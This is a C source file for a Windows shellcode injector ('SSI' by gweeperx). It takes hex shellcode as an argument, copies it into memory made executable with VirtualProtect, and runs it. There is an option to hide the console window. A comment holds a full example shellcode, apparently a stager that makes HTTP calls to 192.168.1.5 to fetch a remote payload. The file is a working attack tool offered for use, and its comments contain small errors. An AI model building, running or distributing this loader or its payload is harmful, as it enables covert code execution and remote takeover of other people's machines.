#include <stdio.h>
#include <Windows.h>

int main(int argc, char *argv[]) {
    //Uncomment to Hide cmd window
    //HWND hWnd = GetConsoleWindow();
    //ShowWindow( hWnd, SW_HIDE );

    unsigned int char_in_hex;

    unsigned static char logo [] = 
    " +-+-+-+ +-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+\n"
    " |S|S|I| |(|S|i|m|p|l|e| |S|h|e|l|l|c|o|d|e| |I|n|j|e|c|t|o|r|)|\n"
    " +-+-+-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+\n"
    " |b|y| |g|w|e|e|p|e|r|x|                                        \n"
    " +-+-+ +-+-+-+-+-+-+-+-+\n";


    char *shellcode=argv[1];
    unsigned int iterations=strlen(shellcode);
    
    //calculate propper size of shellcode to allocate, when we convert the char array to shellcode.
    /*
    Assume the following:

    char shellcode[] = "fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865d686e6574006877696e6954684c772607ffd5e80000000031ff5757575757683a5679a7ffd5e9a40000005b31c951516a03515168bb01000053506857899fc6ffd550e98c0000005b31d252680032a08452525253525068eb552e3bffd589c683c350688033000089e06a04506a1f566875469e86ffd55f31ff57576aff5356682d06187bffd585c00f84ca01000031ff85f6740489f9eb0968aac5e25dffd589c16845215e31ffd531ff576a0751565068b757e00bffd5bf002f000039c775075850e97bffffff31ffe991010000e9c9010000e86fffffff2f534251760010e6a943d06b0a01998993993de4d7a31dbd6c730ff24103c4b6c145af762d03f70daefc53b54ffacc2773b3e97c614922d651a253a9ac460482713dda17192e75a1fe9b0ab52ceadf00557365722d4167656e743a204d6f7a696c6c612f352e302028636f6d70617469626c653b204d53494520392e303b2057696e646f7773204e5420362e313b2057696e36343b207836343b2054726964656e742f352e303b204d414e4d3b204d414e4d290d0a0074f04569fe36ede59f5d32cd50ca3d50d0ee88ea5ae85842d882a7148527c93e3d92c992dbbd5da4c75163bd724b14bfbebffb729dc1c806cb0653555871fcd7b9711edc874db96138bd2ff3666e6e2a916d53f72b777ced51de845ed385fd87ebd47c0eebe8981f99a882c516fd53b34475f9ef5c98bccfe07512f23a919ee49e0ef8a5be1fb447ba6bcac2d8704fba54c1366ecf625ac92ae8b1ec64b31b5d8d93d7230cfef20f4c1afc4c7ca7b8500e798fa94d0b9c2ba2c68259d720b1eeb797ded8c2438a6e850068f0b5a256ffd56a4068001000006800004000576858a453e5ffd593b90000000001d9515389e7576800200000535668129689e2ffd585c074c68b0701c385c075e558c3e889fdffff3139322e3136382e312e350059f4da17";

    The shellcode array, consists of 1666 characters (shellcode[0]=f to shellcode[1665]=7 plus a null terminator shellcode[1666]=nullTerminator ).
    The strlen(shellcode)=1666 and the sizeof(shellcode)=16667 , because it calculates the null terminator.

    Below we calculate the proper size of memory we need to allocate:

    The number of characters which are going to be converted to the shellcode bytes, are 1666 characters (in this example) and these are shellcode[0] to shellcode[1665])
    The null terminator is not part of the shellcode, so we have :
    x=(sizeof(shellcode) - 1) . or x= strlen(shellcode)/2

    2. These 1666 characters in pair, are going to create a byte. Every 2 chacracters are going to represent one byte. For example fc (which is actually \xfc) will be converted to 1 byte:
    So the tottal number of bytes in the final shellcode are bytes=x/2 , or bytes = (sizeof(shellcode) - 1)/2  or bytes = strlen(shellcode)/2.
    This equals to 833 bytes of pure shellcode bytes, which do not contain the null terminator.

    */


    unsigned int memory_allocation = strlen(shellcode) / 2; //memory we are going to allocate for shellcode
   
 
    printf("%s\n\n", &logo);

    /*
    convert to shellcode:

    Iterations is equal to strlen(shellcode) which is the total number of characters (in the above example 1666 shellcode[0] to shellcode[1665]).
    We convert in pairs, so for i=0 we are going to read shellcode[0] and shellcode[1] in order to create one byte from those 2 chars.
    The last byte will be created for i=1664 which will convert the characters shellcode[1664] and shellcode[1665]. So the last time we are going to enter the loop
    will be for i = 1664, meaning i<16665 which is i < 1666-1 or i < iterations-1
    */

    for(unsigned int i = 0; i< iterations-1; i++) {
        sscanf(shellcode+2*i, "%2X", &char_in_hex);
        shellcode[i] = (char)char_in_hex;
    }


    void *exec = VirtualAlloc(0, memory_allocation, MEM_COMMIT, PAGE_READWRITE);
    memcpy(exec, shellcode, memory_allocation);
    DWORD ignore;
    VirtualProtect(exec, memory_allocation, PAGE_EXECUTE, &ignore);

    printf("Ready? Go!");
    (*(void (*)()) exec)();
    
    return 0;
}
